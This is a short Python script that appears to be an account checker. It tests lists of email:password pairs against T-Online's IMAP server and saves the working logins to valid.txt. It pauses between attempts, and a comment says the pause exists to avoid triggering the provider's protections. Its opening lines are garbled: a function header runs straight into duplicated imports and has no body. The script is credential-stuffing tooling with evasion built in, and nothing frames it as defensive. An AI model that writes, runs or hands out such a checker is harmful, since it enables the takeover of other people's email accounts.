import imaplib
import time

def get_code(EMAIL_ACCOUNT, EMAIL_PASSWORD, IMAP_SERVER):import imaplib
import time

IMAP_SERVER = "secureimap.t-online.de"
IMAP_PORT = 993

def test_account(email, password):
    try:
        mail = imaplib.IMAP4_SSL(IMAP_SERVER, IMAP_PORT, timeout=15)
        mail.login(email, password)
        mail.logout()
        return True, "LOGIN OK"

    except imaplib.IMAP4.error as e:
        return False, f"LOGIN FAILED: {e}"

    except Exception as e:
        return False, f"ERROR: {e}"


with open("accounts.txt", "r", encoding="utf-8") as f:
    accounts = [line.strip() for line in f if line.strip()]

for account in accounts:
    try:
        email, password = account.split(":", 1)
    except ValueError:
        print(f"[INVALID FORMAT] {account}")
        continue

    ok, message = test_account(email, password)

    if ok:
        print(f"[+] {email} -> {message}")
        with open("valid.txt", "a", encoding="utf-8") as out:
            out.write(f"{email}|{password}\n")
    else:
        print(f"[-] {email} -> {message}")

    # Keep requests slow to avoid triggering provider protections
    time.sleep(3)
